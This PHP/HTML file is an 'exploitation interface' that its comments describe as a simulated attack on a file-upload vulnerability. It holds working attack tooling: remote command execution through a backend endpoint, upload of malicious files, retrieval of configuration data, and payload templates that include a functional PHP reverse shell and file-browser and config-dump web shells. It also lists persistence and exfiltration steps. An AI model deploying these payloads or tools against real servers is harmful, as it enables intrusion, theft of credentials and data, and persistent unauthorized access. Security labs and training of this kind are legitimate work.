<?php
// backend_exploit_interface.php - Frontend interface for backend exploitation
// This simulates a real attacker's interface

$backendUrl = 'backend_server.php';
$response = '';
$backendData = '';

// Function to make requests to backend
function makeBackendRequest($endpoint, $method = 'GET', $data = null) {
    global $backendUrl;
    
    $url = $backendUrl . '/' . $endpoint;
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'status_code' => $httpCode,
        'response' => $response,
        'endpoint' => $endpoint
    ];
}

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'check_status':
                $result = makeBackendRequest('status');
                $backendData = json_decode($result['response'], true);
                $response = "Backend Status Checked";
                break;
                
            case 'get_config':
                $result = makeBackendRequest('config');
                $backendData = json_decode($result['response'], true);
                $response = "Configuration Retrieved (SENSITIVE DATA)";
                break;
                
            case 'get_logs':
                $result = makeBackendRequest('logs');
                $backendData = json_decode($result['response'], true);
                $response = "Server Logs Retrieved";
                break;
                
            case 'list_files':
                $result = makeBackendRequest('files');
                $backendData = json_decode($result['response'], true);
                $response = "File Listing Retrieved";
                break;
                
            case 'get_system':
                $result = makeBackendRequest('system');
                $backendData = json_decode($result['response'], true);
                $response = "System Information Retrieved";
                break;
                
            case 'execute_command':
                if (!empty($_POST['command'])) {
                    $commandData = json_encode(['command' => $_POST['command']]);
                    $result = makeBackendRequest('execute', 'POST', $commandData);
                    $backendData = json_decode($result['response'], true);
                    $response = "Command Executed: " . htmlspecialchars($_POST['command']);
                }
                break;
        }
    }
}

// Handle file uploads
if (isset($_FILES['payload_file']) && $_FILES['payload_file']['error'] === UPLOAD_ERR_OK) {
    $file = $_FILES['payload_file'];
    
    // Create cURL request for file upload
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $backendUrl . '/upload');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $postData = [
        'file' => new CURLFile($file['tmp_name'], $file['type'], $file['name'])
    ];
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    
    $uploadResponse = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $backendData = json_decode($uploadResponse, true);
    $response = "File Upload Attempt: " . htmlspecialchars($file['name']);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backend Exploitation Interface</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        .section {
            background: #2a2a2a;
            border: 1px solid #00ff00;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .section h3 {
            margin-top: 0;
            color: #ffff00;
        }
        .form-group {
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ffff;
        }
        input[type="text"], input[type="file"], textarea {
            width: 100%;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            margin: 5px;
        }
        button:hover {
            background: #cc0000;
        }
        .response {
            background: #000000;
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .payload-templates {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .payload-card {
            background: #2a2a2a;
            border: 1px solid #ff6600;
            padding: 15px;
            border-radius: 5px;
        }
        .payload-card h4 {
            color: #ff6600;
            margin-top: 0;
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }
        .status-online {
            background: #00ff00;
        }
        .status-offline {
            background: #ff0000;
        }
        .sensitive {
            background: #330000;
            border-color: #ff0000;
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üî¥ Backend Exploitation Interface</h1>
            <p>Simulated Attack Interface for File Upload Vulnerability Testing</p>
            <div class="status-indicator status-online"></div>
            <span>Backend Server: ONLINE</span>
        </div>

        <!-- Backend Information Gathering -->
        <div class="section">
            <h3>üì° Backend Reconnaissance</h3>
            <form method="POST">
                <input type="hidden" name="action" value="check_status">
                <button type="submit">Check Backend Status</button>
            </form>
            
            <form method="POST">
                <input type="hidden" name="action" value="get_system">
                <button type="submit">Get System Information</button>
            </form>
            
            <form method="POST">
                <input type="hidden" name="action" value="get_logs">
                <button type="submit">Get Server Logs</button>
            </form>
            
            <form method="POST">
                <input type="hidden" name="action" value="list_files">
                <button type="submit">List Uploaded Files</button>
            </form>
        </div>

        <!-- Sensitive Data Access -->
        <div class="section sensitive">
            <h3>‚ö†Ô∏è Sensitive Data Access</h3>
            <form method="POST">
                <input type="hidden" name="action" value="get_config">
                <button type="submit">Get Configuration (SENSITIVE)</button>
            </form>
        </div>

        <!-- File Upload Exploitation -->
        <div class="section">
            <h3>üìÅ File Upload Exploitation</h3>
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label>Upload Malicious Payload:</label>
                    <input type="file" name="payload_file" required>
                </div>
                <button type="submit">Upload & Execute</button>
            </form>
        </div>

        <!-- Command Execution -->
        <div class="section">
            <h3>‚ö° Command Execution</h3>
            <form method="POST">
                <input type="hidden" name="action" value="execute_command">
                <div class="form-group">
                    <label>System Command:</label>
                    <input type="text" name="command" placeholder="whoami" required>
                </div>
                <button type="submit">Execute Command</button>
            </form>
        </div>

        <!-- Payload Templates -->
        <div class="section">
            <h3>üéØ Payload Templates</h3>
            <div class="payload-templates">
                <div class="payload-card">
                    <h4>Information Gathering</h4>
                    <p><strong>File:</strong> info.php</p>
                    <textarea readonly rows="4"><?php
echo "=== SYSTEM INFO ===\n";
echo "OS: " . php_uname() . "\n";
echo "PHP: " . phpversion() . "\n";
echo "User: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'Unknown') . "\n";
echo "PWD: " . getcwd() . "\n";
echo "Files: " . implode(', ', scandir('.')) . "\n";
?></textarea>
                </div>
                
                <div class="payload-card">
                    <h4>Database Dump</h4>
                    <p><strong>File:</strong> db_dump.php</p>
                    <textarea readonly rows="4"><?php
echo "=== DATABASE DUMP ===\n";
$config = json_decode(file_get_contents('backend_config/database.conf'), true);
foreach($config as $key => $value) {
    echo "$key: $value\n";
}
?></textarea>
                </div>
                
                <div class="payload-card">
                    <h4>Reverse Shell</h4>
                    <p><strong>File:</strong> shell.php</p>
                    <textarea readonly rows="4"><?php
$ip = $_GET['ip'] ?? '127.0.0.1';
$port = $_GET['port'] ?? '4444';
$sock = fsockopen($ip, $port);
if($sock) {
    while($cmd = fgets($sock)) {
        $output = shell_exec($cmd);
        fwrite($sock, $output);
    }
}
?></textarea>
                </div>
                
                <div class="payload-card">
                    <h4>File Browser</h4>
                    <p><strong>File:</strong> browser.php</p>
                    <textarea readonly rows="4"><?php
$path = $_GET['path'] ?? '.';
echo "=== FILE BROWSER ===\n";
echo "Current: $path\n";
$files = scandir($path);
foreach($files as $file) {
    if($file != '.' && $file != '..') {
        $fullPath = $path . '/' . $file;
        $size = is_file($fullPath) ? filesize($fullPath) : 'DIR';
        echo "$file ($size)\n";
    }
}
?></textarea>
                </div>
            </div>
        </div>

        <!-- Response Display -->
        <?php if ($response || $backendData): ?>
        <div class="section">
            <h3>üìä Backend Response</h3>
            <div class="response">
                <strong>Action:</strong> <?php echo htmlspecialchars($response); ?><br><br>
                <strong>Backend Data:</strong><br>
                <?php echo htmlspecialchars(json_encode($backendData, JSON_PRETTY_PRINT)); ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- Instructions -->
        <div class="section">
            <h3>üìñ Exploitation Instructions</h3>
            <ol>
                <li><strong>Reconnaissance:</strong> Use the reconnaissance tools to gather information about the backend</li>
                <li><strong>Configuration:</strong> Access sensitive configuration data</li>
                <li><strong>Upload Payload:</strong> Upload one of the payload templates or create your own</li>
                <li><strong>Execute:</strong> The backend will automatically execute PHP files upon upload</li>
                <li><strong>Command Execution:</strong> Use the command execution to run system commands</li>
                <li><strong>Monitor:</strong> Check logs and file listings to see the impact</li>
            </ol>
            
            <h4>üéØ Real-World Impact:</h4>
            <ul>
                <li><strong>Data Exfiltration:</strong> Access sensitive configuration files</li>
                <li><strong>System Access:</strong> Execute commands on the server</li>
                <li><strong>Persistence:</strong> Upload backdoors for continued access</li>
                <li><strong>Privilege Escalation:</strong> Exploit server misconfigurations</li>
            </ul>
        </div>
    </div>
</body>
</html>
